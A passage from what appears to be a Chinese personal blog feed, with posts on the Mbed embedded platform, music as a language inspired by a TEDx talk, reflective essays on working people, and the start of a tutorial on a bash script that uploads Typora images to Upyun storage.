class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码量少了多少，一眼可见吧？这个例子只是初始化一个IO口，其他的比如串口，PWM，SPI，CAN等等外设，Mbed都会像初始化一个IO一样，非常简单。</p><h2 id="丰富的API"><a href="#丰富的API" class="headerlink" title="丰富的API"></a>丰富的API</h2><p>不同于Arduino，Arduino的代码结构是有两个主要的函数，一个是初始化的，一个是大循环。我们的很多项目中，大循环的形式，效率相当底下，这也是我不太喜欢使用Arduino的原因。</p><p>Mbed提供了丰富的API，如RTOS的API，外设的API，数据存储的API，甚至于网络相关的API（如DNS，NetworkSocket）等等。</p><h2 id="优秀的跨平台能力"><a href="#优秀的跨平台能力" class="headerlink" title="优秀的跨平台能力"></a>优秀的跨平台能力</h2><p>这里列出Mbed支持的厂商吧，单是这长长的一列，你用的cortex架构芯片，哪个不是这些厂商出的？</p><center><img src="https://pic.gaficat.com/default/%E8%B7%A8%E5%B9%B3%E5%8F%B0%E8%83%BD%E5%8A%9B.png" alt="优秀的跨平台能力" style="zoom: 50%;" /></center><p>比如当我们针对ST公司的芯片，开发出一个产品。这时候需要更换另一个公司的芯片时，只需要改一下引脚即可，底层的驱动完全不用我关心，是不是从未有过如此爽快的体验？</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>Mbed真的极大的拉低了硬件开发的门槛。以前我有一个创意，我可能会因为要再看一遍野火的《STM32库开发实战指南》，再熟悉一下各种结构体，各种外设应该怎么配置，想到如此复杂的过程，很快就放弃了。但现在，我有一个想法，用Mbed，我可以很快实现我的想法，即使我半年一年没接触过硬件的开发了，我已经不熟悉某一款芯片了，也没问题，好的工具真的能激发人创作的欲望。</p><p>其实我始终认为，硬件的开发，对于我们学生或者极客而言，IDE、OS都是工具，我们的目的是借助这些硬件实现我们的创意，无论是机器人还是我想做的开灯神器（手动滑稽），我们不应该把精力浪费在这些工具上。我们希望用最快的速度，最少的弯路，先把自己的创意实现了，再去关注原理（甚至于某些情况下，原理我们都不用关注）。而不是把百分之八十以上的时间，花在学习芯片本身应该如何使用，驱动应该怎么写上。等你做完这些事，也就没有心境去完成你的创意了。硬件的开发，门槛不应该被拉的这么高。</p><blockquote><p> 我印象最深刻的，就是大学那会儿我因为要生成一个控制舵机的PWM，从STC89C52，到STC12C5A60S2，到STC15系列，整整折腾了半年时间。大家感兴趣吗？感兴趣的话，我就再给自己挖一个坑，之后写一篇文章，痛述当年的心酸历程。</p></blockquote><p>前段时间，我在知乎上看到一个回答，说中国嵌入式行业的学生们，并不像CS专业的学生，始终接触最新的技术，去努力提升自己，而是用着十几年前的IDE，循规蹈矩的做一些事。我在大学也是做机器人的，也是用着十几年前的IDE过来的。中国的学生、极客，在这方面真的很吃亏。不是我们不思进取，而是我们从一个做机器人、电子设计或是物联网的念头开始，了解到单片机这个概念。我们希望学习各种知识，但我们接触到的信息，就是郭天祥多年前的51单片机教程，然后去学习一款性能并不怎么样的芯片。就是野火的《STM32库开发实战指南》，花费很长的学习周期，学会调库，但是各种结构体，依然让人非常的抓狂。不是嵌入式的同学们不愿意接触最新的东西，而是我们压根都不知道，还有Mbed这种东西呢？还有Platformio这种东西呢？硬件还能这么玩呢？我们身边的老师不知道有这些东西，我们的学长不知道有这些东西。我们就只能用最笨的办法，最老的工具，最浪费时间的方式，走很多的弯路，浪费非常多不必要的时间和精力。</p><p>这种现状，导致了我们参加一个比赛、或是实现一个创意，百分之八十的时间都是在熟悉芯片的使用，熟悉各种传感器、电机的原理，折腾驱动，而真正做产品，实现功能的时间非常少。Mbed勾起了我重新玩单片机的热情，所以我非常想把这样一个工具告诉所有正在接触单片机、希望用单片机实现一些创意的人，它真的把硬件开发的门槛降得非常低。</p><p>我不奢求我这样一个单片机的爱好者，写这样一篇文章，就能改变现状。我只希望自己把折腾的过程，走过的弯路，整理成文字，祈祷文章中的关键字，能被百度、谷歌收录，有更多的人看到我的文章。我之后会出一系列的文章，比如我在使用Mbed的过程中遇到的一些问题，或者时我用Mbed实现的一些小创意。无论你是从博客还是知乎等平台看到我的文章，都请大家RSS订阅或者关注走一波吧，原创不易，但愿至少当你在百度或者google搜索的时候，不至于冒出来的全是一堆英文链接吧！</p>]]></content>
    
    
    <categories>
      
      <category>电子设计</category>
      
      <category>Mbed</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子设计</tag>
      
      <tag>Mbed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学乐器不是为了成为人体播放器！</title>
    <link href="/posts/e4dcbcaf.html"/>
    <url>/posts/e4dcbcaf.html</url>
    
    <content type="html"><![CDATA[<p>最近看了官大卫的关于音乐的TEDx，很认同他的观点：<strong>这个世界已经不需要更多的人体音乐播放器</strong>。我觉得觉得一定要写这样一篇文章，给自己和所有人看，如果进来了，真的看完吧，铁子，这篇文章里的例子挺有意思的。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近看youtube的视频，看到了江老师和Eric邀请VK.克（超喜欢他的《花水月》和《雪舞》啊！）做关于视奏的节目，发现这些音乐家其实生活里也都挺逗的，并不像舞台上那么高冷。看的过程中，突然对钢琴的视奏有了兴趣，江老师的一点我认为说的特别对，“很多人学琴的时候，都是先费力的识谱，记住每个音该弹哪儿，之后丢掉谱子，依靠肌肉记忆，练会一个曲子”。这不说的是我吗？！而经验丰富的钢琴伴奏，通常会对旋律的调式、琴键的位置非常熟悉，他们看到前几个音大致就能推测出后面几个音走势是什么样的。这其实是一种对音乐的综合能力，不仅仅是演奏本身技巧上的东西。</p><p>后来因为这样一个视谱的视频，从江老师到官大卫，最后我翻到了官大卫关于音乐的TEDx。其实你会发现，音乐很有意思，他也有理性在里面，通过升降某个音的频率，我们会得到情感完全不一样的旋律。它也有感性在里面，作曲家会把自己的情感抒发到旋律里面。我真的很同意官大卫的观点——<strong>这个世界已经不需要更多的人体音乐播放器。</strong></p><p>先贴上官大卫TEDx的视频吧，感兴趣的小伙伴可以看看原视频，很多小伙伴应该看不到youtube上的视频，我就放一个bilibili搬运工的吧：</p>        <style>.bbplayer{width: 100%; max-width: 850px; margin: auto}</style>        <div class="bbplayer">        <iframe class="bbplayer" id="mmedia-VvesnWHj" src="//player.bilibili.com/player.html?aid=12970201&page=1&high_quality=1&danmaku=false"            allowfullscreen="no"            scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups"></iframe>        </div>        <script>            document.getElementById("mmedia-VvesnWHj").style.height=document.getElementById("mmedia-VvesnWHj").scrollWidth*0.76+"px";            window.onresize = function(){              document.getElementById("mmedia-VvesnWHj").style.height=document.getElementById("mmedia-VvesnWHj").scrollWidth*0.76+"px";            };        </script>        <h1 id="音乐的理性"><a href="#音乐的理性" class="headerlink" title="音乐的理性"></a>音乐的理性</h1><p>音乐是有它的规律在里面的。我们熟知的音乐家、作曲家，绝不会因为灵光乍现，在完全不懂音乐规律的前提下，创作出一首曲子来。那么就用一个小例子，告诉大家音乐的规律。</p><p>一首歌的旋律其实是建立在音阶之上的，我们可以不知道音阶是什么，但是大家一定见过下面这个东西：</p><center><img src="https://pic.gaficat.com/default/官大卫TEDX大调五个音.png" alt="官大卫TEDX大调五个音" style="zoom: 20%;" /></center><p>Do Re Mi Fa Sol这五个音，其实有非常多的歌都是建立在这五个音之上的，比如我们都听过的一首圣诞歌曲：</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-PbrlIjVf" style="margin-bottom: 20px; width: 50%;"></div>        <script>          var ap_PbrlIjVf = new APlayer({            element: document.getElementById("mmedia-PbrlIjVf"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "大调",              author: "官大为",              url: "https://music.gaficat.com/%E5%A4%A7%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_PbrlIjVf);        </script><p>我们在听到这首歌的时候，会觉得是一段非常欢快的旋律，非常的明亮，让人开心。那么声音的高低是由振动频率决定的，我们可以把刚才听到的这一段旋律中Mi这个音的频率降低百分之六，我们就会得到一段非常忧伤的音乐。</p><center><img src="https://pic.gaficat.com/default/官大为TEDX小调五个音.png" alt="官大为TEDX小调五个音" style="zoom:20%;" /></center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-OgBdwsSd" style="margin-bottom: 20px; width: 50%;"></div>        <script>          var ap_OgBdwsSd = new APlayer({            element: document.getElementById("mmedia-OgBdwsSd"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "小调",              author: "官大为",              url: "https://music.gaficat.com/%E5%B0%8F%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_OgBdwsSd);        </script><p>那如果我们把第二个音Re的频率降低百分之六，刚才的旋律会变成什么味道呢？没错，你会得到一段咖喱味十足的旋律。</p><center><img src="https://pic.gaficat.com/default/官大为TEDX咖喱味五个音.png" alt="官大为TEDX咖喱味五个音" style="zoom:20%;" /></center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-rQQTEquk" style="margin-bottom: 20px; width: 50%;"></div>        <script>          var ap_rQQTEquk = new APlayer({            element: document.getElementById("mmedia-rQQTEquk"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "咖喱味儿",              author: "官大为",              url: "https://music.gaficat.com/%E5%92%96%E5%96%B1%E9%A3%8E%E5%91%B3%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_rQQTEquk);        </script><p>前面两个都是降低频率，当然也可以升高某些音的旋律，比如把第四和第五个音，Fa和Sol的频率升高百分之六，我们就会得到一段虚无缥缈的旋律。</p><center><img src="https://pic.gaficat.com/default/官大为TEDX虚无五个音.png" alt="官大为TEDX虚无五个音" style="zoom:20%;" /></center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-ctUMrQTU" style="margin-bottom: 20px; width: 50%;"></div>        <script>          var ap_ctUMrQTU = new APlayer({            element: document.getElementById("mmedia-ctUMrQTU"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "缥缈",              author: "官大为",              url: "https://music.gaficat.com/%E7%BC%A5%E7%BC%88%E8%B0%83.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_ctUMrQTU);        </script><p>那现在我觉得提高百分之六不够，我希望把Fa和Sol的频率升高百分之十二，我们会得到怎样的旋律呢？我们会得到一段非常中国风的旋律。</p><center><img src="https://pic.gaficat.com/default/官大为TEDX中国风五个音.png" alt="官大为TEDX中国风五个音" style="zoom:20%;" /></center>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <div id="mmedia-JnRWeBUB" style="margin-bottom: 20px; width: 50%;"></div>        <script>          var ap_JnRWeBUB = new APlayer({            element: document.getElementById("mmedia-JnRWeBUB"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "中国风",              author: "官大为",              url: "https://music.gaficat.com/%E4%B8%AD%E5%9B%BD%E9%A3%8E.mp3",              pic: "",              lrc: ""            },            undefined          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap_JnRWeBUB);        </script><p>我从小到大学了十几年钢琴，后来在大学也上过什么音乐鉴赏课，但是从来没有老师跟我说过这样的规律。可能老师们自己学过枯燥的乐理，知道大调明亮、欢快、有力，小调忧伤，五声音阶是中国风的感觉。但是，他们不会给你讲，把这些非常有意思的东西分享给你，除非你是真正音乐专业的学生。但是，难道我们真的感觉不到，这才是音乐真正有魅力的地方吗？</p><h1 id="音乐是一种语言，为了表达情感"><a href="#音乐是一种语言，为了表达情感" class="headerlink" title="音乐是一种语言，为了表达情感"></a>音乐是一种语言，为了表达情感</h1><p>想起来之前看过官大卫关于视奏的视频，想温故知新。官大卫举了一个很有意思的例子，视谱厉害的人，看谱子就像看下面这段话：</p><blockquote><p>一二三四五六七八九十</p></blockquote><p>而你视谱，看到的谱子是这样的：</p><blockquote><p>明饿傻定红我这米玩改</p></blockquote><p>举这个例子其实想说，音乐也是一种语言，谱子是音乐的文字。那麽把音乐比作学语言，比如英语，学英语的时候，老师讲有“听、说、读、写”四个部分。音乐的“听、说、读、写”是什么呢？听，要听得明白音的高低，音程是什么，和声的走向是什么。说，要能用音乐表达自己的情感，你可以说你学过十几年钢琴，但是你写过歌吗？你有过即兴演奏吗？读，视谱能力，看到谱子能快速的分析出调性、曲式等信息。写，演奏能力，写得快，写的规范工整，不就和我们学琴的时候，期望的弹得快，弹得准一样吗？</p><p>我们不难发现，<strong>现在学习音乐，只是在学习“写”的能力。</strong>我们学习语言，汉语、英语或是其他语言，显然不仅仅是为了写得快，写得好。当然有专门学书法的，但是学语言，肯定还是希望能利用这种语言能更好的和其他人交流。我们可以学习演讲，锻炼自己的胆量；我们也可以学习写作，散文或是流水账，记录、抒发自己的心境；我们甚至可以专门学习书法，修心养性。这些都是学语言，那么学乐器、学音乐，不关心语言本身——不关心这种语言的的语法是什么；不关心规律是什么；不关心应该怎么用它去和别人交流，抒发自己的情感；只求记住每个字的笔画，准确、快速写出来。这就和我们学乐器的初衷大相径庭了。</p><p>照着谱子，我们的ipod可以播放任何的曲子，不管多快多慢，它会比人更加准确。<strong>那么我们学乐器的初衷是什么呢？</strong>是成为人体ipod，照着谱子，播放一些曲子吗？我觉得不是，我们不应该关注我会用这个乐器，发出什么声音，而是应该是学会用音乐这种语言，借助某种乐器，把自己的情绪表达出来。这个过程是有趣的，就像我们写作一样，我们不需要每个人都成为莫言那样的作家，因为每个人都有写作的权利，不管是给自己的女朋友写情书，还是给家人写信。而是<strong>把音乐当成一种语言，用音乐去交流，这才应该是我们学习乐器的初衷，是我们学习音乐的初衷。</strong></p><h1 id="尾巴（大部分是官大为讲的）"><a href="#尾巴（大部分是官大为讲的）" class="headerlink" title="尾巴（大部分是官大为讲的）"></a>尾巴（大部分是官大为讲的）</h1><blockquote><p>音乐其实是一种语言，是一种关于振动频率和时间差的语言，和所有的语言一样，他有自己的字母、单词、语法。<strong>我们不需要上帝给我们特别的音乐基因，才能成为音乐家或者作曲家，才能去写歌。我们要做的，其实是去了解音乐的语法、规律。语言的意义，永远不是它发出了什么声音，而是它表达了什么情感。</strong></p></blockquote><blockquote><p>事实上，现在音乐专业的教育，也是有问题的，音乐学院希望把学习乐器的学生，训练成非常优秀的演奏家，训练成非常厉害的音乐执行者，或者说的难听一点，试图把学生训练成一台人体ipod。ipod的功能，就是你可以把乐谱丢给它，它可以一五一十的把音乐播放出来。但是你把乐谱拿走，让ipod用音乐来表达自己想法，任何ipod都做不到。那么在之前，也许很有必要，经过苦练才能听到难度极高的曲子。但现在，只要动一动手机，搜一搜，你可以听到最顶级的演奏家，演奏李斯特，演奏巴赫，演奏肖邦。我们还需要音乐系每年产出这么多的毕业生，重复着同样的音乐吗？</p></blockquote><p>其实，无论是音乐系的学乐器的学生，还是作为一个兴趣爱好，学乐器的我们，都太过于重视苦练，而忽视了<strong>创造</strong>。我们把一个依靠创造力并且非常有意思的东西，变成了一个依靠无尽的重复，无比枯燥的东西。当然不是说苦练不重要，苦练、学习前人的音乐重要，他让我们掌握演奏中的发力技巧，让我们具备创造时，弹出来的基本功。但是，一切都是希望让我们更了解音乐的本质，因为了解了音乐的本质，才能让我们用音乐这种语言，去表达我们自己的想法，创造不一样的东西，改变世界。</p><center><img src="https://pic.gaficat.com/default/苦练和创造.png" alt="苦练和创造" style="zoom:25%;" /></center><p><strong>因为这个世界已经不需要更多的人体音乐播放器，我们需要的是更多勇于创造的音乐家！</strong></p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>看到蜘蛛人，我想到了什么</title>
    <link href="/posts/ab4902bc.html"/>
    <url>/posts/ab4902bc.html</url>
    
    <content type="html"><![CDATA[<p>最近还是挺开心的，一是Q1绩效被定为Q+了，刚调过薪水，再涨xx%，着实开心啊（一个部门30个人，一个季度一个Q+，百分之九十都是博士，入职不到两年，这是我第二次Q+，很多资源领导确实挺偏袒我的）。二是虽然有一段时间没更新文章了，但现在每天会有一部分小伙伴直接访问网站，很感谢这些小伙伴的关注，不更一点内容都不好意思啦。当然，你们有的可能只是想找点乐子，就跟看老罗带货直播翻车的笑话一样。</p><h1 id="蜘蛛人"><a href="#蜘蛛人" class="headerlink" title="蜘蛛人"></a>蜘蛛人</h1><blockquote><p>上班的时候，听到窗外叮咚一阵异响。抬头一望，看到窗外整齐地下来了一排蜘蛛人，蜘蛛人先掏出刷子，给玻璃刷上泡沫，之后，相互传递水枪，冲走泡沫，最后换另一种刷子，刮干净水渍。一面玻璃不超过30秒，相当熟练。</p></blockquote><p>本来觉得物业找蜘蛛人擦外窗很正常，没打算写一篇文章。但是中午吃完饭，准备回去继续上班的时候，一个蜘蛛人整坐在路边的树荫下歇息，年纪不大，十七八岁，脱掉鞋子，脚放在鞋子上。特别开心的望着正在擦窗子的同伴，吆喝着注意安全。也就是那么一瞬间，我们两四目相对。忽然觉得，就在这么一个园区里面。有像我们一样，朝九晚五，拿着固定薪水的人。也有高空作业，挣危险钱的蜘蛛人。也许他很羡慕我们这样坐办公室的人，没有风吹日晒，但是其实他也不知道，我们也有自己的苦恼。换位思考，我们也有羡慕的人，但我们羡慕、想成为的人也会有自己的苦恼。</p><p>我忽然想起以前高中的时候我写的日记，也记录着当时看到的一些人。</p><h1 id="街头艺人"><a href="#街头艺人" class="headerlink" title="街头艺人"></a>街头艺人</h1><p>老远边听出了那是《二泉映月》，旋律十分忧伤，十分连贯。</p><p>放学回家的我，骑着车急匆匆地从他身边驶过，突然一个急刹停了下来，这麽连贯的旋律？一定隐藏着一段非同寻常的故事吧！</p><p>那是一位70岁左右的老人，长胡子，蓬头散发，衣衫褴褛，很像街边乞食的乞丐。老人忘我地演奏者二胡，旋律依然忧伤、连贯。母亲是民歌演唱家，我从小，便在歌剧团里，听着各种乐器长大。老人的演奏水平，确实十分高超，因为隔壁住在一个老头，年龄大了，耳朵不好使了，音都拉不准了，磕磕绊绊的。</p><p>老人周围散落着些照片，照片有些泛黄，看得出有些年头了。照片上是老人年轻时与许多不同人的合影。</p><p>我掏出身上所有的钱(事实上我不喜欢给乞丐钱，我认为人一定要靠自己努力去赚钱，而不是乞讨，所以，面对一般的乞丐，我会从边上冷冷的走过，并不是我没有爱心，我觉得，他不值得让我去施舍。）放进了老人面前的碗中，老人冲我一笑“好好学习！”，听得出，是河南口音。</p><p>从小到大，家长、老师给我说过了无数次“好好学习”，可老人的话，却让心辛酸，我认识到正在学习的我是最幸福的，老人学得一身手艺，年轻时，一定很出名，如今却靠街头卖艺为生。</p><h1 id="搬运工"><a href="#搬运工" class="headerlink" title="搬运工"></a>搬运工</h1><p>刚好赶上搬家，父亲便找了几个搬运工。</p><p>搬运工们似乎有着用不完的力气，家里的许多包裹，家电，是我和父亲两个人都搬不动的，而看着搬运工们面对狭窄的楼道，门框，灵活的应对，面对不懂的家具，总有不同的搬法，暗自觉得，搬个东西还能这样啊？人咋这么聪明呢？</p><p>家里有架钢琴，几位搬运工通力合作，抬起钢琴艰难地向前挪动，每迈出一步，都感到整个楼房震动一下，能感受到他们肩上的分量。由于是下楼，走在前面的搬运工不免吃力些，可走在后面的却不停的埋怨，走在前面的便说了：“你个猪头！我走在前面，吃了大亏，你还埋怨？”众人一笑，抬起钢琴，继续下楼。望着钢琴，几个搬运工议论着“你说这么重的个东西，要多少钱啊？”“估计你一年也挣不来。”“我们就是天亮了干活，天黑了睡觉，每天整个百十块钱就行了，当然买不起。”众人一笑，继续卖力地干起活来。</p><p>搬运工们正搬着东西，楼下装满货物的车子与小区路中间的树有3米宽。这时来了一辆红色轿车，车主是个化了浓妆的女人，探出脑袋，“诶！那几个，把你们车子移开。！”神情和口气充满了蔑视，我示意她从旁边绕过去，她便没说什么，绕了过去。搬运工们便对我说：“你说这旁边火车都过得去，她一个汽车过不去？”我只是笑笑，不知道如何回答。</p><p>我的几大箱书，压得搬运工很吃力，他们便开玩笑道：“你要是能把这几大箱书全部装进脑子，那就好了！”</p><p>职业无贵贱，我很佩服靠自己劳动生活的那些生活底层的人们，他们，其实也是一群乐观，有尊严，勤劳，单纯的人。</p><h1 id="理发师"><a href="#理发师" class="headerlink" title="理发师"></a>理发师</h1><p>进门便看见了他，十八九岁，着装整齐，十分精神，与旁边那些杀马特们截然不同。</p><p>洗完头便坐了下来。“你好！”他走了过来，准备为我理发，我一愣，理了这么久的发，头一回见打招呼的理发师，印象中理发师通常是理发过程中与顾客聊聊。</p><blockquote><p>“刚放学？我看你穿着校服！”</p><p>“是啊！”“在哪上学？”</p><p>“XX中学”</p><p>“嗯，好地方……”</p></blockquote><p>理发师似乎想说些什么，有欲言又止。</p><blockquote><p>“其实，如果我继续上学，我是今年应届考生，只可惜我选择的学校不好，在X县那边，父母最终不让我上学了，我便学了这手艺。”</p></blockquote><p>他的话，流露出一些伤感。</p><blockquote><p>“现在，有的大学生毕了业，照样找不到工作，你学了这手艺，起码将来不用为工作发愁了，也挺好的！”</p><p>“也许您从电视上、报纸上看到许多这样的事，但是大学生找不到工作的毕竟是少数，再说，等你上了大学，你会明白，大学其实是个十分美好的地方。哎，只可惜我与大学无缘。只有当你不入了社会，你才会发现，上不上大学，差别其实很大的。”</p></blockquote><p>理发师的话，让我再次不知道说什么好，他便继续为我理发。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>这是一个两极分化非常严重的社会，富人的纸醉金迷你想象不到，穷人的饮水栖衡你也想象不到。我们呢？虽然对未来有规划，一定程度的压力和焦虑，也能刺激我们进步。但和他们相比，正在看这篇文章的你我，我们还行吧？我们有什么理由不快乐呢？</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typora自定义命令自动上传图片</title>
    <link href="/posts/6f888707.html"/>
    <url>/posts/6f888707.html</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>Typora是我非常喜欢的Markdown编辑器，之前的一个更新，Typora支持了“上传图像”的功能（即写文章时，插入图片自动将其上传至图床），我们可以直接借助IPic、uPic、PicGo等程序，配合Typora自动将图片上传至又拍云等对象存储平台。但是，官方的文档晦涩难懂，我尝试进行了一些配置，但始终还是不好使，那咋办嘛？</p><p>其实，将本地图片上传至图床，这个过程本质上来说就是一条HTTP请求，但是如果这个过程还需要在后台一直开着一个图床软件或者安装一些命令行工具（更何况很多工具也是收费的），代价就有些大了。庆幸的是，Typora支持不借助这些图床工具，通过自定义命令（脚本）的方式，完成自动上传图片的功能。</p><p>那么，能不能自己写一个十几行代码的脚本来适配Typora呢？当然可以了。</p><h1 id="一起开始吧"><a href="#一起开始吧" class="headerlink" title="一起开始吧"></a>一起开始吧</h1><p>以Typora自定义命令上传图片为例，当我们从我们插入一张图片时，发生了什么？我们在Typora插入一张本地的图片后，Typora会调用预先设置的自定义命令（通常是运行一个脚本）来上传图片，自定义命令（脚本）上传完图片后输出（注意这里有坑）相应的URL，Typora会读取该URL，并自动把本地图片地址替换为相应的URL。所以只要配置得当，我们在写作时，只需要准备好素材，直接对素材<code>command + c</code>、<code>command + v</code>了。</p> <center><img src="https://pic.gaficat.com/default/Typora自定义命令上传图片的流程.jpg" alt="Typora自定义命令上传图片的流程" style="zoom: 50%;" /></center><p>综上所述，如果我们要通过自定义命令来上传图片，只需要三步：</p><ul><li>编写能够上传图片至相应的图床或者对象存储的脚本</li><li>在偏好设置中进行相应的设置</li><li>测试是否正常</li></ul><h2 id="编写脚本（上传至又拍云对象存储）"><a href="#编写脚本（上传至又拍云对象存储）" class="headerlink" title="编写脚本（上传至又拍云对象存储）"></a>编写脚本（上传至又拍云对象存储）</h2><p>一开始我尝试使用Python实现，但是发现Typora的自定义脚本，似乎并不能完美的调用Python脚本（也可能是自己没处理好一些参数之类的东西）。无奈，面向搜索引擎，现学现卖，最终用shell脚本实现了通过REST API上传图片至又拍云对象存储的功能，结果发现代码量出奇的少，脚本如下所示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 各类配置信息</span><br>bucket=<span class="hljs-string">&quot;sample&quot;</span> <span class="hljs-comment"># 云存储服务的名称</span><br>remote_path=<span class="hljs-string">&quot;default/&quot;</span> <span class="hljs-comment"># 上传默认的路径</span><br>auth=<span class="hljs-string">&quot;xxxxxxx&quot;</span> <span class="hljs-comment"># 操作员名和操作员密码按照operator:password拼接Base64编码</span><br>base_url=<span class="hljs-string">&quot;https://xxx.xxx.xx/&quot;</span> <span class="hljs-comment"># 对象存储绑定的域名</span><br><br><span class="hljs-comment"># 上传图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span>; <span class="hljs-keyword">do</span><br>    curl https://v0.api.upyun.com/<span class="hljs-string">&quot;<span class="hljs-variable">$bucket</span>&quot;</span>/<span class="hljs-string">&quot;<span class="hljs-variable">$remote_path</span>&quot;</span> -H <span class="hljs-string">&quot;Authorization: Basic &quot;</span><span class="hljs-string">&quot;<span class="hljs-variable">$auth</span>&quot;</span> --upload-file <span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Upload Success:&quot;</span><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span>; <span class="hljs-keyword">do</span><br>    IFS=<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-built_in">read</span> -r -a array &lt;&lt;&lt; <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span><br>    id=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;#array[@]&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$base_url</span>&quot;</span><span class="hljs-string">&quot;<span class="hljs-variable">$remote_path</span>&quot;</span><span class="hljs-string">&quot;<span class="hljs-variable">$&#123;array[$id-1]&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>脚本相对简单（具体API可以参考<a href="https://help.upyun.com/docs/storage/">又拍云官网</a>），分为三部分：</p><ul><li>各类配置信息。又拍云对象存储相关的信息。</li><li>上传图片。使用<code>curl</code>命令调用REST API上传图片。</li><li>输出结果。适配Typora，输出结果。</li></ul><p>我们在写一个脚本的时候，大体上关注三部分内容，输入、处理过程和输出。处理过程是自己实现的所以还好，但Typora上传图片自定义命令的<strong>传参和输出</strong>是真的奇坑。</p><ul><li><p>传参。Typora上传图片调用自定义命令时，会将待上传的图片作为命令行参数，传入脚本。如<code>bash upload.sh 1.jpg 2.jpg</code>，这里具体有几张待上传的图片不确定，所以参数长度是不固定的，你的脚本必须上传所有作为参数传入的图片。Typora并没有在文档中直接说明这一点（传参的方式、长度），真的给我坑坏了。</p></li><li><p>输出。事实上，Typora并不关心我们脚本中上传图片的具体过程如何，它只关心我们脚本的最终输出。Typora要求脚本输出结果的方式简单粗暴，直接<code>echo</code>（其他语言比如Python的<code>print</code>）。注意，直接<code>echo</code>也是有格式要求的，脚本需要首先输出<code>Upload Success:</code>，之后，一行对应一个URL，具体格式如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">Upload <span class="hljs-attr">Success:</span><br><span class="hljs-attr">https:</span><span class="hljs-comment">//sample.com/1.jpg</span><br><span class="hljs-attr">https:</span><span class="hljs-comment">//sample.com/2.jpg</span><br></code></pre></td></tr></table></figure></li></ul><p>这里，我使用shell脚本，将图片上传至又拍云。事实上，你可以使用任何变成语言，上传图片至任意的平台。只要你脚本处理好传入的参数，上传完所有图片，最终的输出结果是上面的格式即可。</p><h2 id="偏好设置"><a href="#偏好设置" class="headerlink" title="偏好设置"></a>偏好设置</h2><p>Typora上传脚本支持的自定义命令，可以在偏好设置中选择。上传服务选择Custom 